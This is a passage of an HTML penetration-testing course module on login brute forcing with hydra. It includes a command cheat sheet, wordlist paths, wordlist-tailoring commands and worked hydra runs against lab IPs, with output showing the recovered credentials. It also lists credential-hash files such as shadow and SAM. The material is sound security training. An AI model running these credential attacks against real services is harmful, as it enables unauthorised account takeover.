@@ -1,0 +1,726 @@
+<html><head></head><body>
+  <div class="container">
+<link rel="stylesheet" href="modules\style.css">
+
+
+<h1 id="13-login-brute-forcing">13. Login Brute Forcing</h1>
+<h2 id="-cheat-sheet-"><strong>Cheat Sheet</strong></h2>
+<p>The cheat sheet is a useful command reference for this module.</p>
+<h2 id="hydra">Hydra</h2>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>hydra -h</code></td>
+<td>hydra help</td>
+</tr>
+<tr>
+<td><code>hydra -C wordlist.txt SERVER_IP -s PORT http-get /</code></td>
+<td>Basic Auth Brute Force - Combined Wordlist</td>
+</tr>
+<tr>
+<td><code>hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /</code></td>
+<td>Basic Auth Brute Force - User/Pass Wordlists</td>
+</tr>
+<tr>
+<td><code>hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&amp;password=^PASS^:F=&lt;form name='login'"</code></td>
+<td>Login Form Brute Force - Static User, Pass Wordlist</td>
+</tr>
+<tr>
+<td><code>hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4</code></td>
+<td>SSH Brute Force - User/Pass Wordlists</td>
+</tr>
+<tr>
+<td><code>hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1</code></td>
+<td>FTP Brute Force - Static User, Pass Wordlist</td>
+</tr>
+</tbody>
+</table>
+<h2 id="wordlists">Wordlists</h2>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt</code></td>
+<td>Default Passwords Wordlist</td>
+</tr>
+<tr>
+<td><code>/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt</code></td>
+<td>Common Passwords Wordlist</td>
+</tr>
+<tr>
+<td><code>/opt/useful/SecLists/Usernames/Names/names.txt</code></td>
+<td>Common Names Wordlist</td>
+</tr>
+</tbody>
+</table>
+<h2 id="misc">Misc</h2>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>cupp -i</code></td>
+<td>Creating Custom Password Wordlist</td>
+</tr>
+<tr>
+<td><code>sed -ri '/^.{,7}$/d' william.txt</code></td>
+<td>Remove Passwords Shorter Than 8</td>
+</tr>
+<tr>
+<td><code>sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt</code></td>
+<td>Remove Passwords With No Special Chars</td>
+</tr>
+<tr>
+<td><code>sed -ri '/[0-9]+/!d' william.txt</code></td>
+<td>Remove Passwords With No Numbers</td>
+</tr>
+<tr>
+<td><code>./username-anarchy Bill Gates &gt; bill.txt</code></td>
+<td>Generate Usernames List</td>
+</tr>
+<tr>
+<td><code>ssh b.gates@SERVER_IP -p PORT</code></td>
+<td>SSH to Server</td>
+</tr>
+<tr>
+<td><code>ftp 127.0.0.1</code></td>
+<td>FTP to Server</td>
+</tr>
+<tr>
+<td><code>su - user</code></td>
+<td>Switch to User</td>
+</tr>
+</tbody>
+</table>
+<h2 id="introduction-to-brute-forcing">Introduction to Brute Forcing</h2>
+<hr>
+<p>A <a href="https://en.wikipedia.org/wiki/Brute-force\_attack">Brute Force</a> attack is a method of attempting to guess passwords or keys by automated probing. An example of a brute-force attack is password cracking. Passwords are usually not stored in clear text on the systems but as hash values.</p>
+<p>Here is a small list of files that can contain hashed passwords:</p>
+<table>
+<thead>
+<tr>
+<th><strong><code>Windows</code></strong></th>
+<th><strong><code>Linux</code></strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>unattend.xml</td>
+<td>shadow</td>
+</tr>
+<tr>
+<td>sysprep.inf</td>
+<td>shadow.bak</td>
+</tr>
+<tr>
+<td>SAM</td>
+<td>password</td>
+</tr>
+</tbody>
+</table>
+<p>Since the password cannot be calculated backward from the hash value, the brute force method determines the hash values belonging to the randomly selected passwords until a hash value matches the stored hash value. In this case, the password is found. This method is also called offline brute-forcing. This module will focus on online brute-forcing and explicitly deal with the websites' login forms.</p>
+<p>On most websites, there is always a login area for administrators, authors, and users somewhere. Furthermore, usernames are often recognizable on the web pages, and complex passwords are rarely used because they are difficult to remember. Therefore it is worth using the online brute forcing method after a proper enumeration if we could not identify any initial foothold.</p>
+<p>There are many tools and methods to utilize for login brute-forcing, like:</p>
+<ul>
+<li><code>Ncrack</code></li>
+<li><code>wfuzz</code></li>
+<li><code>medusa</code></li>
+<li><code>patator</code></li>
+<li><code>hydra</code></li>
+<li>and others.</li>
+</ul>
+<p>In this module, we will be mainly using <code>hydra</code>, as it is one of the most common and reliable tools available.</p>
+<p>The following topics will be discussed:</p>
+<ul>
+<li>Brute forcing basic HTTP auth</li>
+<li>Brute force for default passwords</li>
+<li>Brute forcing login forms</li>
+<li>Brute force usernames</li>
+<li>Creating personalized username and password wordlists based on our target</li>
+<li>Brute forcing service logins, such as FTP and SSH</li>
+</ul>
+<h2 id="password-attacks">Password Attacks</h2>
+<hr>
+<p>We found an unusual host on the network during our black box penetration test and had a closer look at it. We discovered a web server on it that is running on a non-standard port. Many web servers or individual contents on the web servers are still often used with the <a href="https://tools.ietf.org/html/rfc7617">Basic HTTP AUTH</a> scheme. Like in our case, we found such a webserver with such a path, which should arouse some curiosity.</p>
+<p>The HTTP specification provides two parallel authentication mechanisms:</p>
+<ol>
+<li><code>Basic HTTP AUTH</code> is used to authenticate the user to the HTTP server.</li>
+<li><code>Proxy Server Authentication</code> is used to authenticate the user to an intermediate proxy server.</li>
+</ol>
+<p>These two mechanisms work very similarly as they use requests, response status codes, and response headers. However, there are differences in the status codes and header names used.</p>
+<p>The Basic HTTP Authentication scheme uses user ID and password for authentication. The client sends a request without authentication information with its first request. The server's response contains the <code>WWW-Authenticate</code> header field, which requests the client to provide the credentials. This header field also defines details of how the authentication has to take place. The client is asked to submit the authentication information. In its response, the server transmits the so-called realm, a character string that tells the client who is requesting the data. The client uses the Base64 method for encoding the identifier and password. This encoded character string is transmitted to the server in the Authorization header field.</p>
+<p><img src="storage\modules\57\bruteforcing\_401.jpg" alt=""></p>
+<p>As we don't have any credentials, nor do we have any other ports available, and no services or information about the webserver to be able to use or attack, the only option left is to utilize password brute-forcing.</p>
+<p>There are several types of password attacks, such as:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Password Attack Type</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Dictionary attack</code></td>
+</tr>
+<tr>
+<td><code>Brute force</code></td>
+</tr>
+<tr>
+<td><code>Traffic interception</code></td>
+</tr>
+<tr>
+<td><code>Man In the Middle</code></td>
+</tr>
+<tr>
+<td><code>Key Logging</code></td>
+</tr>
+<tr>
+<td><code>Social engineering</code></td>
+</tr>
+</tbody>
+</table>
+<p>We will mainly focus on <code>Brute Force</code> and <code>Dictionary Attacks</code>. Both of these attacks will find the password by <code>brute forcing</code> the service.</p>
+<hr>
+<h3 id="brute-force-attack">Brute Force Attack</h3>
+<p>A <code>Brute Force Attack</code> does not depend on a wordlist of common passwords, but it works by trying all possible character combinations for the length we specified. For example, if we specify the password's length as <code>4</code>, it would test all keys from <code>aaaa</code> to <code>zzzz</code>, literally <code>brute forcing</code> all characters to find a working password.</p>
+<p>However, even if we only use lowercase English characters, this would have almost half a million permutations -<code>26x26x26x26 = 456,976</code>-, which is a huge number, even though we only have a password length of <code>4</code>.</p>
+<p>Once the password length starts to increase, and we start testing for mixed casings, numbers, and special characters, the time it would take to brute force, these passwords can take millions of years.</p>
+<p>All of this shows that relying completely on brute force attacks is not ideal, and this is especially true for brute-forcing attacks that take place over the network, like in <code>hydra</code>.\
+That is why we should consider methods that may increase our odds of guessing the correct password, like <code>Dictionary Attacks</code>.</p>
+<hr>
+<h3 id="dictionary-attack">Dictionary Attack</h3>
+<p>A <code>Dictionary Attack</code> tries to guess passwords with the help of lists. The goal is to use a list of known passwords to guess an unknown password. This method is useful whenever it can be assumed that passwords with reasonable character combinations are used.</p>
+<p>Luckily, there is a huge number of passwords wordlist, consisting of the most commonly used passwords found in tests and database leaks.</p>
+<p>We can check out the <a href="https://github.com/danielmiessler/SecLists">SecLists</a> repo for wordlists, as it has a huge variety of wordlists, covering many types of attacks.\
+We can find password wordlists in our PwnBox in <code>/opt/useful/SecLists/Passwords/</code>, and username wordlists in <code>/opt/useful/SecLists/Usernames/</code>.</p>
+<hr>
+<h3 id="methods-of-brute-force-attacks">Methods of Brute Force Attacks</h3>
+<p>There are many methodologies to carry a Login Brute Force attacks:</p>
+<table data-header-hidden=""><thead><tr><th width="263"></th><th></th></tr></thead><tbody><tr><td><strong>Attack</strong></td><td><strong>Description</strong></td></tr><tr><td>Online Brute Force Attack</td><td>Attacking a live application over the network, like HTTP, HTTPs, SSH, FTP, and others</td></tr><tr><td>Offline Brute Force Attack</td><td>Also known as Offline Password Cracking, where you attempt to crack a hash of an encrypted password.</td></tr><tr><td>Reverse Brute Force Attack</td><td>Also known as username brute-forcing, where you try a single common password with a list of usernames on a certain service.</td></tr><tr><td>Hybrid Brute Force Attack</td><td>Attacking a user by creating a customized password wordlist, built using known intelligence about the user or the service.</td></tr></tbody></table>
+
+<h2 id="default-passwords">Default Passwords</h2>
+<hr>
+<p>Default passwords are often used for user accounts for testing purposes. They are easy to remember and are also used for default accounts of services and applications intended to simplify first access. It is not uncommon for such user accounts to be overlooked or forgotten. Due to the natural laziness of man, everyone tries to make it as comfortable as possible. This, in turn, leads to inattentiveness and the resulting errors, which can harm the company's infrastructure.</p>
+<p>As we saw when we visited the website, it prompted the <code>Basic HTTP Authentication</code> form to input the username and password. Basic HTTP Authentication usually responses with an HTTP <code>401 Unauthorized</code> response code. As we mentioned previously, we will resort to a Brute Forcing attack, as we do not have enough information to attempt a different type of attack, which we will cover in this section.</p>
+<hr>
+<h3 id="hydra">Hydra</h3>
+<p><code>Hydra</code> is a handy tool for Login Brute Forcing, as it covers a wide variety of attacks and services and is relatively fast compared to the others. It can test any pair of credentials and verify whether they are successful or not but in huge numbers and a very quick manner.</p>
+<p>If we want to use it on our own machine, we can either use "<code>apt install hydra -y</code>" or download it and use it from its <a href="https://github.com/vanhauser-thc/thc-hydra">Github Repository</a> but its pre-installed on Pwnbox.</p>
+<p>We can take a look at the options that <code>hydra</code> provides and see its flags and examples of how it can be used:</p>
+<p>Default Passwords</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ hydra -h
+
+Syntax: hydra [<span class="hljs-string">[[-l LOGIN|-L FILE</span>] [<span class="hljs-string">-p PASS|-P FILE</span>]] | [<span class="hljs-string">-C FILE</span>]] [<span class="hljs-string">-e nsr</span>] [<span class="hljs-string">-o FILE</span>] [<span class="hljs-string">-t TASKS</span>] [<span class="hljs-string">-M FILE [-T TASKS</span>]] [<span class="hljs-string">-w TIME</span>] [<span class="hljs-string">-W TIME</span>] [<span class="hljs-string">-f</span>] [<span class="hljs-string">-s PORT</span>] [<span class="hljs-string">-x MIN:MAX:CHARSET</span>] [<span class="hljs-string">-c TIME</span>] [<span class="hljs-string">-ISOuvVd46</span>] [<span class="hljs-string">-m MODULE_OPT</span>] [<span class="hljs-string">service://server[:PORT</span>][<span class="hljs-symbol">/OPT</span>]]
+
+Options:
+<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">...SNIP...</span>&gt;</span></span>
+  -s PORT   if the service is on a different default port, define it here
+  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
+  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
+  -u        loop around users, not passwords (effective! implied with -x)
+  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
+  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
+  service   the service to crack (see below for supported protocols)
+
+<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">...SNIP...</span>&gt;</span></span>
+
+Examples:
+  hydra -l user -P passlist.txt ftp://192.168.0.1
+  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
+  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
+  hydra -l admin -p password ftp://[192.168.0.0/24]/
+  hydra -L logins.txt -P pws.txt -M targets.txt ssh
+</code></pre>
+<hr>
+<h3 id="default-passwords">Default Passwords</h3>
+<p>As we don't know which user to brute force, we will have to brute force both fields. We can either provide different wordlists for the usernames and passwords and iterate over all possible username and password combinations. However, we should keep this as a last resort.</p>
+<p>It is very common to find pairs of usernames and passwords used together, especially when default service passwords are kept unchanged. That is why it is better to always start with a wordlist of such credential pairs -e.g. <code>test:test</code>-, and scan all of them first.</p>
+<p>This should not take a long time, and if we could not find any working pairs, we would move to use separate wordlists for each or search for the top 100 most common passwords that can be used.</p>
+<p>We can find a list of default password login pairs in the <a href="https://github.com/danielmiessler/SecLists">SecLists</a> repository as well, specifically in the <code>/opt/useful/SecLists/Passwords/Default-Credentials</code> directory within Pwnbox. In this case, we will pick <code>ftp-betterdefaultpasslist.txt</code> as it seems to be the most relevant to our case since it contains a variety of default user/password combinations. We will be using the following flags, based on help page above:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Options</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-C ftp-betterdefaultpasslist.txt</code></td>
+<td>Combined Credentials Wordlist</td>
+</tr>
+<tr>
+<td><code>SERVER_IP</code></td>
+<td>Target IP</td>
+</tr>
+<tr>
+<td><code>-s PORT</code></td>
+<td>Target Port</td>
+</tr>
+<tr>
+<td><code>http-get</code></td>
+<td>Request Method</td>
+</tr>
+<tr>
+<td><code>/</code></td>
+<td>Target Path</td>
+</tr>
+</tbody>
+</table>
+<p>The assembled command results:</p>
+<p>Default Passwords</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /
+
+Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">use</span> <span class="hljs-keyword">in</span> military <span class="hljs-keyword">or</span> secret service organizations, <span class="hljs-keyword">or</span> <span class="hljs-keyword">for</span> illegal purposes (this <span class="hljs-keyword">is</span> non-binding, these *** <span class="hljs-keyword">ignore</span> laws <span class="hljs-keyword">and</span> ethics anyway).
+
+[<span class="hljs-keyword">DATA</span>] <span class="hljs-keyword">max</span> <span class="hljs-number">16</span> tasks per <span class="hljs-number">1</span> <span class="hljs-keyword">server</span>, overall <span class="hljs-number">16</span> tasks, <span class="hljs-number">66</span> login tries, ~<span class="hljs-number">5</span> tries per task
+[<span class="hljs-keyword">DATA</span>] attacking <span class="hljs-keyword">http</span>-<span class="hljs-keyword">get</span>://<span class="hljs-number">178.211</span><span class="hljs-number">.23</span><span class="hljs-number">.155</span>:<span class="hljs-number">31099</span>/
+[<span class="hljs-number">31099</span>][<span class="hljs-keyword">http</span>-<span class="hljs-keyword">get</span>] host: <span class="hljs-number">178.211</span><span class="hljs-number">.23</span><span class="hljs-number">.155</span>   login: <span class="hljs-keyword">test</span>   <span class="hljs-keyword">password</span>: testingpw
+[<span class="hljs-keyword">STATUS</span>] attack finished <span class="hljs-keyword">for</span> <span class="hljs-number">178.211</span><span class="hljs-number">.23</span><span class="hljs-number">.155</span> (valid pair <span class="hljs-keyword">found</span>)
+<span class="hljs-number">1</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> valid <span class="hljs-keyword">password</span> <span class="hljs-keyword">found</span>
+</code></pre>
+<p>It's pretty common for administrators to overlook test or default accounts and their credentials. That is why it is always advised to start by scanning for default credentials, as they are very commonly left unchanged. It is even worth testing for the top 3-5 most common default credentials manually, as it can very often be found to be used.</p>
+<p>We can visit the website again and try the same pair to verify that they do work:</p>
+<p><img src="storage\modules\57\bruteforcing\_index.jpg" alt=""></p>
+<p>As we can see, we do get access, and the pair indeed works. Next, we can try to attempt running the second type of scan by separate user wordlists for usernames and passwords and see how long it takes to find the same pair we just identified.</p>
+<h2 id="username-brute-force">Username Brute Force</h2>
+<p>We now know the basic usage of <code>hydra</code>, so let us try another example of attacking HTTP basic auth by using separate wordlists for usernames and passwords.</p>
+<hr>
+<h3 id="wordlists">Wordlists</h3>
+<p>One of the most commonly used password wordlists is <code>rockyou.txt</code>, which has over 14 million unique passwords, sorted by how common they are, collected from online leaked databases of passwords and usernames. Basically, unless a password is truly unique, this wordlist will likely contain it. <code>Rockyou.txt</code> already exists in our Pwnbox. If we were using <code>hydra</code> on a local VM, we could download this wordlist from the <a href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt">Hashcat GitHub Repository</a>. We can find it in the following directory:</p>
+<p>Username Brute Force</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ locate rockyou.txt
+
+<span class="hljs-regexp">/opt/</span>useful<span class="hljs-regexp">/SecLists/</span>Passwords<span class="hljs-regexp">/Leaked-Databases/</span>rockyou.txt
+</code></pre>
+<p>As for our usernames wordlist, we will utilize the following wordlist from <code>SecLists</code>:</p>
+<p>Username Brute Force</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ locate names.txt
+
+<span class="hljs-regexp">/opt/</span>useful<span class="hljs-regexp">/SecLists/</span>Usernames<span class="hljs-regexp">/Names/</span>names.txt
+</code></pre>
+<p>This is a short list of common usernames that may be found on any server.</p>
+<hr>
+<h3 id="username-password-attack">Username/Password Attack</h3>
+<p><code>Hydra</code> requires at least 3 specific flags if the credentials are in one single list to perform a brute force attack against a web service:</p>
+<ol>
+<li><code>Credentials</code></li>
+<li><code>Target Host</code></li>
+<li><code>Target Path</code></li>
+</ol>
+<p>Credentials can also be separated by <code>usernames</code> and <code>passwords</code>. We can use the <code>-L</code> flag for the usernames wordlist and the <code>-P</code> flag for the passwords wordlist. Since we don't want to brute force all the usernames in combination with the passwords in the lists, we can tell <code>hydra</code> to stop after the first successful login by specifying the flag <code>-f</code>.</p>
+<p>Tip: We will add the "-u" flag, so that it tries all users on each password, instead of trying all 14 million passwords on one user, before moving on to the next.</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ hydra -L /</span>opt<span class="hljs-regexp">/useful/</span>SecLists<span class="hljs-regexp">/Usernames/</span>Names<span class="hljs-regexp">/names.txt -P /</span>opt<span class="hljs-regexp">/useful/</span>SecLists<span class="hljs-regexp">/Passwords/</span>Leaked-Databases<span class="hljs-regexp">/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /</span>
+
+[DATA] max <span class="hljs-number">16</span> tasks per <span class="hljs-number">1</span> server, overall <span class="hljs-number">16</span> tasks, <span class="hljs-number">243854766</span> login tries (<span class="hljs-string">l:</span><span class="hljs-number">17</span>/<span class="hljs-string">p:</span><span class="hljs-number">14344398</span>), ~<span class="hljs-number">15240923</span> tries per task
+[DATA] attacking http-<span class="hljs-string">get:</span><span class="hljs-comment">//178.35.49.134:32901/</span>
+[STATUS] <span class="hljs-number">9105.00</span> tries/min, <span class="hljs-number">9105</span> tries <span class="hljs-keyword">in</span> <span class="hljs-number">00</span>:<span class="hljs-number">01</span>h, <span class="hljs-number">243845661</span> to do <span class="hljs-keyword">in</span> <span class="hljs-number">446</span>:<span class="hljs-number">22</span>h, <span class="hljs-number">16</span> active
+
+&lt;...SNIP...&gt;
+[<span class="hljs-number">32901</span>][http-get] <span class="hljs-string">host:</span> <span class="hljs-number">178.35</span><span class="hljs-number">.49</span><span class="hljs-number">.134</span>   <span class="hljs-string">login:</span> thomas   <span class="hljs-string">password:</span> thomas1
+
+[STATUS] attack finished <span class="hljs-keyword">for</span> SERVER_IP (valid pair found)
+<span class="hljs-number">1</span> of <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> valid password found
+</code></pre>
+<p>We see that we can still find the same working pair, but in this case, it took much longer to find them, taking nearly 30 minutes to do so. This is because while default passwords are commonly used together, they clearly are not among the top when it comes to individual wordlists. So, either the username or the password is buried deep into our wordlist, taking much longer to reach.</p>
+<hr>
+<h3 id="username-brute-force">Username Brute Force</h3>
+<p>If we were to only brute force the username or password, we could assign a static username or password with the same flag but lowercase. For example, we can brute force passwords for the <code>test</code> user by adding <code>-l test</code>, and then adding a password word list with <code>-P rockyou.txt</code>.</p>
+<p>Since we already found the password in the previous section, we may statically assign it with the "<code>-p</code>" flag, and only brute force for usernames that might use this password.</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ hydra -L /</span>opt<span class="hljs-regexp">/useful/</span>SecLists<span class="hljs-regexp">/Usernames/</span>Names<span class="hljs-regexp">/names.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /</span>
+
+Hydra (<span class="hljs-string">https:</span><span class="hljs-comment">//github.com/vanhauser-thc/thc-hydra)</span>
+[DATA] max <span class="hljs-number">16</span> tasks per <span class="hljs-number">1</span> server, overall <span class="hljs-number">16</span> tasks, <span class="hljs-number">17</span> login tries (<span class="hljs-string">l:</span><span class="hljs-number">17</span>/<span class="hljs-string">p:</span><span class="hljs-number">1</span>), ~<span class="hljs-number">2</span> tries per task
+[DATA] attacking http-<span class="hljs-string">get:</span><span class="hljs-comment">//178.35.49.134:32901/</span>
+
+[<span class="hljs-number">32901</span>][http-get] <span class="hljs-string">host:</span> <span class="hljs-number">178.35</span><span class="hljs-number">.49</span><span class="hljs-number">.134</span>   <span class="hljs-string">login:</span> abbas   <span class="hljs-string">password:</span> amormio
+<span class="hljs-number">1</span> of <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> valid password found
+Hydra (<span class="hljs-string">https:</span><span class="hljs-comment">//github.com/vanhauser-thc/thc-hydra)</span>
+</code></pre>
+<h2 id="hydra-modules">Hydra Modules</h2>
+<hr>
+<p>Since we found a login form on the webserver for administrators during our penetration testing engagement, it is a very interesting component to which we should try to gain access without generating much network traffic. Finally, with the admin panels, we can manage servers, their services, and configurations. Many admin panels have also implemented features or elements such as the <a href="https://github.com/b374k/b374k">b374k shell</a> that might allow us to execute OS commands directly.</p>
+<hr>
+<h3 id="login-php">Login.php</h3>
+<p><img src="storage\modules\57\web\_fnb\_admin\_login\_1.jpg" alt=""></p>
+<p>To cause as little network traffic as possible, it is recommended to try the top 10 most popular administrators' credentials, such as <code>admin:admin</code>.</p>
+<p>If none of these credentials grant us access, we could next resort to another widespread attack method called password spraying. This attack method is based on reusing already found, guessed, or decrypted passwords across multiple accounts. Since we have been redirected to this admin panel, the same user may have access here.</p>
+<hr>
+<h3 id="brute-forcing-forms">Brute Forcing Forms</h3>
+<p><code>Hydra</code> provides many different types of requests we can use to brute force different services. If we use <code>hydra -h</code>, we should be able to list supported services:</p>
+<p>Hydra Modules</p>
+<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ hydra -h | grep <span class="hljs-string">"Supported services"</span> | tr <span class="hljs-string">":"</span> <span class="hljs-string">"\n"</span> | tr <span class="hljs-string">" "</span> <span class="hljs-string">"\n"</span> | column -e
+
+Supported                    ldap3<span class="hljs-string">[-{cram|digest}md5]</span><span class="hljs-string">[s]</span>    rsh
+services                    memcached                    rtsp
+                            mongodb                        s7-<span class="hljs-number">300</span>
+adam6500                    mssql                        sip
+asterisk                    mysql                        smb
+cisco                        nntp                        smtp<span class="hljs-string">[s]</span>
+cisco-enable                oracle-listener                smtp-enum
+cvs                            oracle-sid                    snmp
+firebird                    pcanywhere                    socks5
+ftp<span class="hljs-string">[s]</span>                        pcnfs                        ssh
+http<span class="hljs-string">[s]</span>-{head|get|post}        pop3<span class="hljs-string">[s]</span>                        sshkey
+http<span class="hljs-string">[s]</span>-{get|post}-form        postgres                    svn
+http-proxy                    radmin2                        teamspeak
+http-proxy-urlenum            rdp                              telnet<span class="hljs-string">[s]</span>
+icq                            redis                        vmauthd
+imap<span class="hljs-string">[s]</span>                        rexec                        vnc
+irc                            rlogin                        xmpp
+ldap2<span class="hljs-string">[s]</span>                    rpcap
+</code></pre>
+<p>In this situation there are only two types of <code>http</code> modules interesting for us:</p>
+<ol>
+<li><code>http[s]-{head|get|post}</code></li>
+<li><code>http[s]-post-form</code></li>
+</ol>
+<p>The 1st module serves for basic HTTP authentication, while the 2nd module is used for login forms, like <code>.php</code> or <code>.aspx</code> and others.</p>
+<p>Since the file extension is "<code>.php</code>" we should try the <code>http[s]-post-form</code> module. To decide which module we need, we have to determine whether the web application uses <code>GET</code> or a <code>POST</code> form. We can test it by trying to log in and pay attention to the URL. If we recognize that any of our input was pasted into the <code>URL</code>, the web application uses a <code>GET</code> form. Otherwise, it uses a <code>POST</code> form.</p>
+<p><img src="storage\modules\57\web\_fnb\_admin\_login\_1.jpg" alt=""></p>
+<p>When we try to log in with any credentials and don't see any of our input in the URL, and the URL does not change, we know that the web application uses a <code>POST</code> form.</p>
+<p>Based on the URL scheme at the beginning, we can determine whether this is an <code>HTTP</code> or <code>HTTPS</code> post-form. If our target URL shows <code>http</code>, in this case, we should use the <code>http-post-form</code> module.</p>
+<p>To find out how to use the <code>http-post-form</code> module, we can use the "<code>-U</code>" flag to list the parameters it requires and examples of usage:</p>
+<p>Hydra Modules</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ hydra http-post-form -U
+
+&lt;...SNIP...&gt;
+Syntax:   &lt;url&gt;:&lt;form parameters&gt;:&lt;condition <span class="hljs-built_in">string</span>&gt;[:&lt;<span class="hljs-keyword">optional</span>&gt;[:&lt;<span class="hljs-keyword">optional</span>&gt;]
+First <span class="hljs-keyword">is</span> the page <span class="hljs-keyword">on</span> the server <span class="hljs-keyword">to</span> <span class="hljs-keyword">GET</span> <span class="hljs-keyword">or</span> POST <span class="hljs-keyword">to</span> (URL).
+Second <span class="hljs-keyword">is</span> the POST/<span class="hljs-keyword">GET</span> variables ...SNIP... usernames <span class="hljs-keyword">and</span> passwords being replaced <span class="hljs-keyword">in</span> the
+ <span class="hljs-string">"^USER^"</span> <span class="hljs-keyword">and</span> <span class="hljs-string">"^PASS^"</span> placeholders
+The third <span class="hljs-keyword">is</span> the <span class="hljs-built_in">string</span> that it checks <span class="hljs-keyword">for</span> an *invalid* login (<span class="hljs-keyword">by</span> <span class="hljs-keyword">default</span>)
+ Invalid condition login check can be preceded <span class="hljs-keyword">by</span> <span class="hljs-string">"F="</span>, successful condition
+ login check must be preceded <span class="hljs-keyword">by</span> <span class="hljs-string">"S="</span>.
+
+&lt;...SNIP...&gt;
+
+Examples:
+ <span class="hljs-string">"/login.php:user=^USER^&amp;pass=^PASS^:incorrect"</span>
+</code></pre>
+<p>In summary, we need to provide three parameters, separated by <code>:</code>, as follows:</p>
+<ol>
+<li><code>URL path</code>, which holds the login form</li>
+<li><code>POST parameters</code> for username/password</li>
+<li><code>A failed/success login string</code>, which lets hydra recognize whether the login attempt was successful or not</li>
+</ol>
+<p>For the first parameter, we know the URL path is:</p>
+<p>Hydra Modules</p>
+<pre><code class="lang-shell-session">/login.php
+</code></pre>
+<p>The second parameter is the POST parameters for username/passwords:</p>
+<p>Hydra Modules</p>
+<pre><code class="lang-shell-session">/login.php:[user <span class="hljs-keyword">parameter</span>]=<span class="hljs-symbol">^USER</span>^&amp;[password <span class="hljs-keyword">parameter</span>]=<span class="hljs-symbol">^PASS</span>^
+</code></pre>
+<p>The third parameter is a failed/successful login attempt string. We cannot log in, so we do not know how the page would look like after a successful login, so we cannot specify a <code>success</code> string to look for.</p>
+<p>Hydra Modules</p>
+<pre><code class="lang-shell-session">/login.php:<span class="hljs-string">[user parameter]</span>=^USER^&amp;<span class="hljs-string">[password parameter]</span>=^PASS^:<span class="hljs-string">[FAIL/SUCCESS]</span>=<span class="hljs-string">[success/failed string]</span>
+</code></pre>
+<hr>
+<h3 id="fail-success-string">Fail/Success String</h3>
+<p>To make it possible for <code>hydra</code> to distinguish between successfully submitted credentials and failed attempts, we have to specify a unique string from the source code of the page we're using to log in. <code>Hydra</code> will examine the HTML code of the response page it gets after each attempt, looking for the string we provided.</p>
+<p>We can specify two different types of analysis that act as a Boolean value.</p>
+<table>
+<thead>
+<tr>
+<th><strong>Type</strong></th>
+<th><strong>Boolean Value</strong></th>
+<th><strong>Flag</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Fail</code></td>
+<td>FALSE</td>
+<td><code>F=html_content</code></td>
+</tr>
+<tr>
+<td><code>Success</code></td>
+<td>TRUE</td>
+<td><code>S=html_content</code></td>
+</tr>
+</tbody>
+</table>
+<p>If we provide a <code>fail</code> string, it will keep looking until the string is <strong>not found</strong> in the response. Another way is if we provide a <code>success</code> string, it will keep looking until the string is <strong>found</strong> in the response.</p>
+<p>Since we cannot log in to see what response we would get if we hit a <code>success</code>, we can only provide a string that appears on the <code>logged-out</code> page to distinguish between logged-in and logged-out pages.\
+So, let's look for a unique string so that if it is missing from the response, we must have hit a successful login. This is usually set to the error message we get upon a failed login, like <code>Invalid Login Details</code>. However, in this case, it is a little bit trickier, as we do not get such an error message. So is it still possible to brute force this login form?</p>
+<p>We can take a look at our login page and try to find a string that only shows in the login page, and not afterwards. For example, one distinct string is <code>Admin Panel</code>:</p>
+<p><img src="storage\modules\57\web\_fnb\_admin\_login\_1.jpg" alt=""></p>
